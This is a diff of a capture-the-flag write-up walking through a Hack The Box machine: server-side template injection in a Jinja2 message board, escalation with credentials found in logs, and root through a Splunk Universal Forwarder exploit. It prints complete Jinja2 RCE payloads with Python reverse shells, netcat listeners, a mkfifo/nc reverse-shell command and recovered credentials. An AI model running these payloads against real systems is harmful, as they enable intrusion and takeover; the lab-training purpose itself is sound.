@@ -264,87 +264,412 @@ ${{<%[%'"}}%\.
 
 If the app processes this as a template, we might get a **500 Internal Server Error**, which is exactly what we want. That would tell us the input is being evaluated, meaning we could be looking at a way to execute commands or leak sensitive data. If nothing happens, input is likely sanitized. 
 
-Let’s drop this into both the title and message fields and see what we get.
+Alright, let’s see what happens if we **drop our polyglot payload** into both the **Title** and **Message** fields. This is our quick-and-dirty way of testing whether the app might be **evaluating** any kind of template syntax. Here we go:
 
-Step 1:
+**Step 1**:  
 ![[post-polygot.png]]
 
-Step 2:
+**Step 2**:  
 ![[polyglot-reflected.png]]
 
-Alright, so what do we see, looks like the application is reflecting this sanitized and we didn't get a 500 internal server error. Similar to the XSS payload lets take a look at the source code to see if we can just get an idea on how things are being filtered.
+So, what happens? The payload is getting **reflected** back at us, albeit in a **sanitized form**. We did **not** trigger a **500 internal server error**, which usually indicates that the input is being directly evaluated by a template engine. This suggests there’s **some** filtering in place, similar to what we saw with our XSS attempt.
 
-Source code review:
+But let’s poke around the **source code** to see if the developer might’ve left behind any **bread crumbs**.
+
 ![[source-code-archive.png]]
 
-Investigating the source code to get an idea on how things are being filtered, what we end up finding it an interesting comment that was left in by the developer. We see that there is another endpoint called /archive. Guessing by our current enumeration of the web application, the fact that this is the source code of the messages, we can assume that archive are just an archive of all the users posts. So lets check out the archive endpoint.
+Sure enough, in the code, there’s a **comment** mentioning another endpoint called **/archive**. Given what we’ve seen so far—our message posts, how they’re stored, etc. it’s a pretty safe bet that **/archive** might be some kind of **archival page** for all user posts. Let’s go check it out.
 
 ![[archive-error.png]]
 
-Oh yea, I mean this is the good stuff. This is about to get a whole lot interesting now. So we just confirmed Template injection, however we still have to investigate which template is throwing the error? What part of the polyglot is being digested? 
+Oh yeah, **this** is the stuff we like to see! We’ve got an **error page**, which strongly hints at **Template Injection**. But we still don’t know which **template engine** is behind the scenes. We also don’t know **which part** of our polyglot was actually swallowed by the template.
 
-There are two ways to confirm something like this. There is a browser extension that was mention by my TCM security teacher called Wappalyzer. This extension tells you what technology is the web application is possibly using. If you already have this extension installed then you probably already noticed that it did say that there is something Python related. If you do not we can take a look at our arsenal and see what we can use to get more information from the web application. We lean back on burp suite.
+To figure that out, we can do one of two things:
 
-Lets start off by using another very popular payload to see what we get .
+1. **Use a browser extension** (like **Wappalyzer**, which my TCM Security instructor recommended) to see what technologies the site might be running.
+2. **Rely on other tools**—for instance, we can fire up **Burp Suite** and glean more details from the HTTP responses.
 
-Lets go with 
+Let’s keep it simple and lean on **Burp Suite**. One of the most common next-step payloads to test for **Server-Side Template Injection (SSTI)** is:
+
 ```
 {{7*7}}
 ```
 
-And also lets just refer to this flow chart:
+We’ll also consult the handy **flowchart** below (screen shot is from payloadsallthethings):
 
 ![[ssti-flowchart.png]]
 
-I decided to go with 
-```plaintext
-{{7*7}}
-```
+The reason I’m picking `{{7*7}}` first is because, per **PayloadsAllTheThings**, these are classic quick-check payloads:
 
-Because we already confirmed template injection so according to the flow chart we have to choose a path, and PayloadsAllTheThings tells us that the following are very common payloads.
+- `{{7*7}}` → typically for **Jinja2 (Python)**
+- `#{7*7}` → typically for **Thymeleaf (Java)**
 
-```
-- `{{7*7}}` for Jinja2 (Python).
-- `#{7*7}` for Thymeleaf (Java).
-```
+Let’s give `{{7*7}}` a whirl. But remember, our **/archive** endpoint is currently **spitting out** a 500 error due to our original post. We need to **remove** that troublesome post first, then create a **fresh** one with our new payload.
 
-So lets just give it a try, here is the plan we are going to go ahead and delete the current post we did because we are always going to get a 500 internal server error if we load into the /archvie endpoint, our main goal right now is to see if we identify the technology that the template is being ran on and also to see if we can get an evaluation on the payload, so it should evaluate to 49.
+**The plan:**
 
-Lets do this in steps:
+1. **Delete** our existing post (the one causing the 500 error at /archive).
+2. Go back and create a **new message**—this time, both Title and Content will be `{{7*7}}`.
+3. **Confirm** that we see it on the main page.
+4. Visit **/archive** again.
 
-1. Lets delete the current message, this is because we will use /archive as just a page to evaluate our payloads. Right now we have it evaluating to an 500 internal server error
-2. Once deleted lets go back to create a new message post
-3. This time we are going to input the payload `{{7*7}}` in both the title and as the content of the message.
-4. We post it, and confirm if it reflects on the page.
-5. We then return back to /archive endpoint.
+Let’s pop open **Burp Suite** and watch the **HTTP history** for `/home` and `/archive`.
 
-Lets investigate /archive and /home with burp suite. Lets head on over to the the HTTP history and locate the two endpoints we want to concentrate on.
+- **BurpSuite /home endpoint**:  
+    ![[burp-server-identity.png]]
+    
+- **BurpSuite /archive endpoint**:  
+    ![[archive-49.png]]
+    
 
-Burpsuite home endpoint:
-![[burp-server-identity.png]]
+Two big takeaways here:
 
+1. The server at `/home` is clearly running **Python**.
+2. Our `{{7*7}}` payload **evaluated** to **49**.
 
-Burpsuite archive endpoint:
-![[archive-49.png]]
-Okay so what have you figured out here, are two things the first at the /home response we can see that the server is running python, and second that the evaluation did in fact evaluate to 49, so referring back to our flowchart, we can determine that we will end up at Jinja2 or Twig.
+Referring back to the flowchart, that means we’re likely dealing with **Jinja2** (or possibly Twig). But since Twig is a **PHP** template engine and we see Python under the hood, we can safely bet on **Jinja2**.
 
-This is pretty exciting. So the idea is we confirm SSTI, then we try a payload to narrow down the template running, then keep narrowing the payload till we hit a confirmation. So lets move on to the `{{7*'7'}} payload` So this payload looks funny but its just taking the number 7 multiplying the string 7, or in this case the character. So the output should be 7777777. 
+This is good news! Now that we have a potential **SSTI** and a strong guess it’s **Jinja2**, we can try **another** quick test: `{{7*'7'}}`. That goofy-looking payload is just `7 multiplied by the character '7'`, which should come out to **7777777** if it works.
 
-
-Okay so now we just upload a new message and do the same thing again, this time we dont have to delete our old message because it isn't causing a 500 internal server error. We go through the process again, we go post a new message, we make sure that it's just on the title, we confirmed this on the burp suite screenshot. So we don't have to post it on the message body. 
-
-We do the same again, we head over to /archive, we head to the source page and verify if our payload is evaluated.
-
-We see 49 from our previous payload, then we see the seven 7 and we now can confirm this can be either Jinja2 or twig but because we now the server is using Python, we have confirmed this to be Jinja2 since Twig is PHP. We can start testing for RCE now.
+Let’s post **another** new message using only the Title field this time (so we’re not cluttering up the page with multiple payloads). Revisit **/archive**, crack open the source, and if all goes well, you’ll see **49** (from our previous payload) and now **7777777**. That all but confirms **Jinja2**. Next stop: **RCE** territory!
 
 ![[archive-jinja-payload.png]]
 
-Alright now this part of the walkthrough we have to understand some things which is what is popen, offset, and understanding the payload all together 
+---
+
+## Understanding the Big Guns: Jinja2 RCE Payloads
+
+Now, this is where things get interesting. Check out this monster payload:
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
 
-It is a lot to read, as web app pen testers payloads are tools for us to use, and as any tool it is important for us to know what our tool does, so lets just understand this payload as a high level overview, and remember, you can always save this in your github repo or notes, or just go back to payloadsallthethings github and do more research on it later or take notes as you do your research and keep it in your arsenal for future use.
+Yes, it’s **ugly**. And yes, it’s **powerful**. As a web app pentester, it’s important to at least understand this at a **high level**:
+
+- It’s basically iterating over Python’s **internal classes** to find a way to execute OS commands.
+- It uses `popen` to run a **Python reverse shell** (in this example, pulling in the contents of `flag.txt`).
+
+So, if you see payloads like this during an engagement (or on HTB), don’t panic—treat them like any other **tool** in your kit. Keep notes on how they work, save them in your personal GitHub repo, or revisit **PayloadsAllTheThings** for a refresher. They’re meant to be **dropped in**, tested, and (hopefully) let you shell the box.
+
+### **Breaking Down the Madness: Jinja2 RCE Payload Explained**
+
+Alright, let’s take a step back because this payload looks like absolute chaos at first glance. If you're wondering, **"What the hell am I even looking at?"**, you're not alone. But don't worry, we’re gonna break it down **high-level style** so it actually makes sense.
+
+#### **Step 1: What’s Happening Here?**
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}
+```
+
+- This **loops through Python’s internal subclasses** to find something useful.
+- Specifically, it's looking for a **class related to warnings**, because some warning-related classes expose **built-in functions** that can execute system commands.
+
+#### **Step 2: Finding the Right Class**
+
+```python
+{% if "warning" in x.__name__ %}
+```
+
+- This **filters** for subclasses that contain `"warning"` in their name.
+- The reason? There’s a sneaky way to **access Python’s built-in modules** through certain system warning classes.
+
+#### **Step 3: Importing the OS Module & Running a Command**
+
+```python
+{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; ...
+```
+
+- **`__import__('os')`** dynamically imports the **OS module**, which lets us interact with the system.
+- **`popen()`** is used to execute a command, in this case, a **Python one-liner reverse shell**.
+
+#### **Step 4: What’s Actually Running?**
+
+```python
+python3 -c 'import socket,subprocess,os; 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
+s.connect(("ip",4444)); 
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2); 
+p=subprocess.call(["/bin/cat", "flag.txt"]);
+```
+
+Here’s what this is doing **step-by-step**:
+
+1. **Creates a TCP socket** (`socket.socket(socket.AF_INET,socket.SOCK_STREAM)`)
+2. **Connects to the attacker's machine** on `IP: 4444`
+	1. Be sure to change the IP to your connected IP!
+3. **Redirects stdin, stdout, and stderr** to the socket (`os.dup2()`)
+4. **Runs a command** (`subprocess.call(["/bin/cat", "flag.txt"])`)
+
+---
+
+### **The Important Part We Care About**
+
+The key part we need to **modify** is:
+
+```python
+subprocess.call(["/bin/cat", "flag.txt"]);
+```
+
+- This is just **reading** `flag.txt`.
+- Instead, we want to **spawn an interactive shell**.
+
+#### **Making It Interactive**
+
+To actually **get a shell**, we replace `cat flag.txt` with `/bin/bash -i`, like so:
+
+```python
+subprocess.call(["/bin/bash", "-i"]);
+```
+
+This ensures that when we **connect back**, we get an **interactive shell** instead of just a single command execution.
+
+---
+
+### **Also, Don’t Forget the Port!**
+
+```python
+s.connect(("ip",4444))
+```
+
+- The number **4444** is the **port we need to listen on**.
+- Before running the payload, make sure to **set up a listener** on your attacking machine:
+    
+    ```bash
+    nc -lvnp 4444
+    ```
+    
+    This will **catch** the incoming connection and drop us into a shell.
+
+---
+
+### **Testing Our RCE Payload: Showtime**
+
+Now that we’ve dissected our payload and know how it works, let’s take it for a **test drive**. We’ll first see what happens **before** we change the command inside.
+
+1. **Craft a new message post** and drop the RCE payload right into the **Title** field.
+2. **Save** the post and head back to `/home` to confirm it’s there.
+
+**Example:**
+
+![[title-payload.png]]
+
+Looks like the board **accepted** our payload. Next, we head on over to `/archive`—this endpoint is basically the **launch pad** for any SSTI goodies we want to fire off.
+
+Before we do that, don’t forget to **set up your listener**:
+
+```plaintext
+nc -lvp 4444
+```
+
+**Now**, with the listener running, we **browse to `/archive`** and cross our fingers, hoping we see an attempt to grab `flag.txt`.
+
+![[jinja-payload-failed.png]]
+
+Sweet! We **did** get a connection, and our payload indeed tried to **cat `flag.txt`**. That’s a good sign—the fundamentals are working. All we have to do now is **swap out `cat flag.txt`** for a **full-blown shell** using `/bin/bash -i`.
+
+---
+
+### **Tweaking the Payload for a Shell**
+
+Here’s the snippet we need to modify:
+
+![[bash-payload.png]]
+
+Basically, we **replace**:
+
+```python
+subprocess.call(["/bin/cat", "flag.txt"]);
+```
+
+with:
+
+```python
+subprocess.call(["/bin/bash", "-i"]);
+```
+
+I’ve got it in the **Message Body** just so you can see it clearly, but you want to **actually place it in the Title** (or wherever the template gets evaluated).
+
+Oh before we fire it away, please also change the IP address it should be to the address you get when you run `ifconfig` the tun0, or if you are on kali it should be visible on the upper right corner of the screen.
+
+---
+
+### **Fire When Ready**
+
+With our payload updated, we repeat the same steps:
+
+1. **Paste the modified payload** into the Title field.
+2. **Save** it.
+3. **Pop over to `/archive`** to trigger the code.
+4. Watch your **listener** for the shell.
+
+Boom, **Reverse Shell** acquired. That moment where you see your terminal spring to life is pure pentester bliss. Almost like a fine wine, take a second and savor it.
+
+![[reverse-shell-success.png]]
+
+As you can see, I tested it by running `pwd` and `id` just to confirm where I ended up and who I’m running as. And with that, we’ve got our **initial foothold** on the box!
+
+Here is the payload one more time just in case you didn't get it to run like I did.
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.38\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 
 
+```
+
+
+
+
+### **💻 Leveling Up: Making Our Shell Interactive**
+
+Alright, we got our initial foothold, but before we start poking around, let’s fix something that might cause a headache later.
+
+Since this server is running Python, we can use a quick trick to **upgrade our shell** into something more interactive. You technically don’t **need** to do this to complete the box, but trust me, it’ll save you some frustration. Without an interactive shell:
+
+- You won’t see password prompts when running commands like `su` (yeah, I learned that the hard way)
+- You can’t use shortcuts like `CTRL+C` or `CTRL+Z` properly
+- Some programs just won’t work right
+
+To avoid these issues, run this as soon as you get a shell:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+Now you’ve got a **fully interactive shell**, and you won’t be left wondering why your commands aren’t doing anything.
+
+### **🔍 Digging Through Logs for Credentials**
+
+Now that we’re comfortable, let’s start hunting for useful information. A good place to look is **log files**. Sometimes, admins log in too fast and accidentally type their password where it doesn’t belong, or a system might log authentication failures that reveal useful usernames or passwords.
+
+To check for any low-hanging fruit, run:
+
+```bash
+grep -R -o "password" /var/log
+```
+
+Here’s what we get:
+
+![[enum-user-creds.png]]
+
+First thing that jumps out is all the **permission denied** errors. No surprise there—we don’t have access to everything yet. But look a little closer and you’ll see something interesting.
+
+There’s a **failed login attempt** for an invalid user named `shaun`. Right below that, we see the string **Guitar123**, but there’s no `@` symbol or domain name next to it. Looks like someone fat-fingered their password into the email field.
+
+So, we might have just found creds:
+
+```
+shaun:Guitar123
+```
+
+### **🔑 Switching to Shaun’s Account**
+
+Let’s test the creds and see if we can log in as `shaun`. Run:
+
+```bash
+su shaun
+```
+
+If the password works, you should see this:
+
+![[login-shaun.png]]
+
+Nice. We’re in. Since we need a **user flag**, it’s safe to assume it’s somewhere in Shaun’s home directory. Let’s start looking around.
+
+### **🕵️‍♂️ Finding the User Flag**
+
+I went up a directory and saw two interesting folders:
+
+- **web** (looks like it has a blog and a script named `blog.sh`)
+- **shaun** (which, based on experience, probably has our flag)
+
+I checked inside `shaun` and sure enough, **user.txt** was sitting there. Let’s grab the flag:
+
+```bash
+cat user.txt
+```
+
+![[userflag.png]]
+
+There it is. The **user flag** is ours. Now we can head back to HTB, submit it, and move on to the real challenge—getting root.
+
+### **🔎 Revisiting Our Recon: What About Splunk?**
+
+During our initial Nmap scan, we saw that **Splunk Universal Forwarder** was running on port **8089**. That stood out because Splunk has a **management interface** that could let us execute commands if we get access.
+
+To confirm, let’s check what processes are running:
+
+![[grep-splunk-proc.png]]
+
+Yup, it’s running. Time to do some **research** and see if there’s a way to exploit it. A quick Google search led me to this page:
+
+[SplunkWhisperer2 - Splunk Universal Forwarder Hijacking](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)
+
+And the GitHub repo for the tool:
+
+[SplunkWhisperer2 GitHub](https://github.com/cnotin/SplunkWhisperer2)
+
+If you’ve never done a box like this before, don’t be surprised if you need to download extra tools that weren’t in your original game plan. That’s normal in both CTFs and real-world pentesting. The more tools you get comfortable with, the better.
+
+One issue I ran into—HTB’s VPN connection was **blocking** my download from GitHub. If you have the same problem, just **disconnect from the VPN, download the tool, and reconnect**.
+
+### **🚀 Exploiting Splunk Universal Forwarder**
+
+Let’s see if we can execute commands using this tool. First, we’ll start with a simple `id` command to test if we have remote code execution (RCE):
+
+```bash
+python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.38 --payload id
+```
+
+That didn’t work—we got an **authentication failure**.
+
+![[pySplunkError.png]]
+
+No big deal. We already found Shaun’s credentials earlier, so let’s **try logging in with those** and see if we can get a full shell instead of just running one command.
+
+First, open up a listener on your machine:
+
+```bash
+nc -lvp 1994
+```
+
+Now, run the exploit with the **correct credentials** and a **reverse shell payload**:
+
+```bash
+python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --username shaun --password Guitar123 --lhost 10.10.14.38 --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.38 1994 >/tmp/0xjcbk_pipe'
+```
+
+Here’s what’s happening:
+
+- `--host 10.10.10.209` → Target machine
+- `--username shaun` → Using Shaun’s creds
+- `--password Guitar123` → The password we found in the logs
+- `--lhost 10.10.14.38` → Our attacking machine
+- `--payload` → Reverse shell that connects back to us
+
+We run the command, and boom—**RCE success**.
+
+![[pysplunkRCE.png]]
+
+### **🎯 Getting Root**
+
+Let’s check our listener:
+
+![[root.png]]
+
+We got a shell. First thing I did was run `ls` to see where I was. The `pwd` command wasn’t giving me output, but `ls` helped me figure out my location.
+
+I spotted a **root** folder, checked inside, and sure enough—**root.txt** was sitting there. Let’s grab the final flag:
+
+```bash
+cat root.txt
+```
+
+And just like that, **we rooted the box**.
+
+### **🛠️ Final Thoughts**
+
+This was my first full HTB box, and I gotta say—it was **a blast**. We started with **basic web enumeration**, leveraged **SSTI for initial access**, pivoted with **log analysis for credentials**, and finished strong by **exploiting Splunk Universal Forwarder for root**.
+
+Hope you enjoyed the walkthrough as much as I did writing it. See you in the next one!
